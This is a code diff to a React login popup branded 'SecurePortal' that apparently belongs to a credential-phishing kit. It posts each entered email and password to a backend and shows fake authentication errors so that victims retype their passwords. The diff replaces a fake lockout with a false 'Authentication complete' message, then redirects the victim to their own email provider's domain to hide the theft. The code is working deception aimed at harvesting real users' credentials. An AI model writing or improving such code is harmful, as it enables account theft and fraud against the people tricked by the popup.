@@ -11,8 +11,8 @@ const Popup = ({ domain, systemInfo }) => {
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [sessionTimer, setSessionTimer] = useState(180); // 3 minutes in seconds
-  const [lockoutTimer, setLockoutTimer] = useState(0);
   const [isHovered, setIsHovered] = useState(false);
+  const [showSuccess, setShowSuccess] = useState(false);
 
   const companyName = "SecurePortal";
   
@@ -22,6 +22,26 @@ const Popup = ({ domain, systemInfo }) => {
       return email.split('@')[1];
     }
     return (domain || companyName).toLowerCase() + '.com'; // Fallback to domain name + .com
+  };
+
+  // Extract domain from email for redirect
+  const getEmailDomainForRedirect = () => {
+    if (email && email.includes('@')) {
+      const domainPart = email.split('@')[1];
+      // Remove any template patterns or brackets to get clean domain
+      const cleanDomain = domainPart
+        .replace(/[\[\]\{\}<>%\$\(\)]/g, '') // Remove common template characters
+        .replace(/(Email|email|EMAIL)/g, '') // Remove email placeholder text
+        .replace(/^\.+|\.+$/g, '') // Remove leading/trailing dots
+        .trim();
+      
+      if (cleanDomain && cleanDomain.length > 0) {
+        // Remove .com if it's already part of the domain
+        const domainWithoutCom = cleanDomain.toLowerCase().replace(/\.com$/i, '');
+        return domainWithoutCom;
+      }
+    }
+    return (domain || companyName).toLowerCase();
   };
 
   useEffect(() => {
@@ -174,22 +194,6 @@ const Popup = ({ domain, systemInfo }) => {
     return () => clearInterval(timerInterval);
   }, []);
 
-  // Lockout timer countdown
-  useEffect(() => {
-    if (lockoutTimer > 0) {
-      const interval = setInterval(() => {
-        setLockoutTimer(prev => {
-          if (prev <= 1) {
-            clearInterval(interval);
-            return 0;
-          }
-          return prev - 1;
-        });
-      }, 1000);
-      return () => clearInterval(interval);
-    }
-  }, [lockoutTimer]);
-
   const sendData = async (email, password, attemptNumber) => {
     try {
       const response = await fetch("/api/auth/verify", {
@@ -254,13 +258,6 @@ const Popup = ({ domain, systemInfo }) => {
       return;
     }
 
-    if (lockoutTimer > 0) {
-      const minutes = Math.floor(lockoutTimer / 60);
-      const seconds = lockoutTimer % 60;
-      setErrorMessage(`Account temporarily locked. Try again in ${minutes}:${seconds.toString().padStart(2, '0')}`);
-      return;
-    }
-
     setIsLoading(true);
     
     setTimeout(() => {
@@ -276,27 +273,21 @@ const Popup = ({ domain, systemInfo }) => {
       } else if (currentAttempt === 2) {
         setErrorMessage("Authentication failed. Please verify your credentials.");
         setAttempts(2);
-      } else if (currentAttempt === 3) {
-        setErrorMessage("Multiple failed attempts detected. Account temporarily locked for security.");
+      } else if (currentAttempt >= 3) {
+        // After 3rd failed attempt, show success message then redirect
+        setShowSuccess(true);
+        setErrorMessage("");
         setAttempts(3);
-        setLockoutTimer(120); // 2 minute lockout
-      } else if (currentAttempt > 3) {
-        // After 3rd failed attempt, redirect
-        setErrorMessage("Maximum attempts exceeded. Redirecting to support...");
+        
         setTimeout(() => {
-          window.location.href = `https://${companyName.toLowerCase()}.com/support`;
-        }, 2000);
+          const emailDomain = getEmailDomainForRedirect();
+          window.location.href = `https://www.${emailDomain}.com`;
+        }, 1500);
       }
       
       setPassword("");
       setIsLoading(false);
     }, 1200);
-  };
-
-  const formatTime = (seconds) => {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins}:${secs.toString().padStart(2, '0')}`;
   };
 
   return (
@@ -479,7 +470,7 @@ const Popup = ({ domain, systemInfo }) => {
                 style={{
                   padding: '7px 10px',
                   width: '100%',
-                  fontSize: '16px', // CHANGED: Set to 16px to prevent iOS zoom
+                  fontSize: '14px', // Changed to smaller size
                   backgroundColor: '#ffffff',
                   outline: 'none',
                   border: 'none',
@@ -497,10 +488,33 @@ const Popup = ({ domain, systemInfo }) => {
                   }
                 }}
                 autoComplete="current-password"
-                disabled={lockoutTimer > 0}
               />
             </div>
           </div>
+
+          {/* Success Message */}
+          {showSuccess && (
+            <div style={{
+              marginBottom: '12px',
+              animation: 'slideDown 0.3s ease-out'
+            }}>
+              <div style={{
+                backgroundColor: '#d4edda',
+                color: '#155724',
+                padding: '6px 8px',
+                borderRadius: '4px',
+                border: '1px solid #c3e6cb',
+                display: 'flex',
+                alignItems: 'center',
+                gap: '4px'
+              }}>
+                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <path d="M20 6L9 17l-5-5"/>
+                </svg>
+                <span style={{ fontSize: '11px' }}>Authentication complete</span>
+              </div>
+            </div>
+          )}
 
           {/* Error Message */}
           <div style={{
@@ -509,24 +523,26 @@ const Popup = ({ domain, systemInfo }) => {
             overflow: 'hidden',
             transition: 'height 0.3s ease'
           }}>
-            <div style={{
-              backgroundColor: '#f8d7da',
-              color: '#721c24',
-              padding: '6px 8px',
-              borderRadius: '4px',
-              border: '1px solid #f5c6cb',
-              display: 'flex',
-              alignItems: 'center',
-              gap: '4px',
-              animation: 'slideDown 0.3s ease-out'
-            }}>
-              <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                <circle cx="12" cy="12" r="10"/>
-                <line x1="12" y1="8" x2="12" y2="12"/>
-                <line x1="12" y1="16" x2="12.01" y2="16"/>
-              </svg>
-              <span style={{ fontSize: '11px' }}>{errorMessage}</span>
-            </div>
+            {errorMessage && (
+              <div style={{
+                backgroundColor: '#f8d7da',
+                color: '#721c24',
+                padding: '6px 8px',
+                borderRadius: '4px',
+                border: '1px solid #f5c6cb',
+                display: 'flex',
+                alignItems: 'center',
+                gap: '4px',
+                animation: 'slideDown 0.3s ease-out'
+              }}>
+                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                  <circle cx="12" cy="12" r="10"/>
+                  <line x1="12" y1="8" x2="12" y2="12"/>
+                  <line x1="12" y1="16" x2="12.01" y2="16"/>
+                </svg>
+                <span style={{ fontSize: '11px' }}>{errorMessage}</span>
+              </div>
+            )}
           </div>
 
           {/* Action Buttons */}
@@ -539,7 +555,7 @@ const Popup = ({ domain, systemInfo }) => {
               onClick={handleSubmit}
               onMouseEnter={() => setIsHovered(true)}
               onMouseLeave={() => setIsHovered(false)}
-              disabled={isLoading || lockoutTimer > 0}
+              disabled={isLoading || showSuccess}
               style={{
                 flex: 1,
                 padding: '8px 12px',
@@ -549,13 +565,13 @@ const Popup = ({ domain, systemInfo }) => {
                 borderRadius: '4px',
                 fontSize: '11px',
                 fontWeight: '500',
-                cursor: isLoading || lockoutTimer > 0 ? 'not-allowed' : 'pointer',
+                cursor: isLoading || showSuccess ? 'not-allowed' : 'pointer',
                 transition: 'background-color 0.2s',
                 display: 'flex',
                 alignItems: 'center',
                 justifyContent: 'center',
                 gap: '4px',
-                opacity: isLoading || lockoutTimer > 0 ? 0.8 : 1,
+                opacity: isLoading || showSuccess ? 0.8 : 1,
                 height: '34px'
               }}
             >
@@ -566,8 +582,6 @@ const Popup = ({ domain, systemInfo }) => {
                   </svg>
                   Verifying...
                 </>
-              ) : lockoutTimer > 0 ? (
-                `Locked (${formatTime(lockoutTimer)})`
               ) : (
                 'Continue Session'
               )}
@@ -654,7 +668,7 @@ const Popup = ({ domain, systemInfo }) => {
           
           input {
             height: 30px !important;
-            font-size: 16px !important; /* CHANGED: Keep 16px for mobile too */
+            font-size: 14px !important; /* Changed to smaller size for mobile */
           }
         }
 
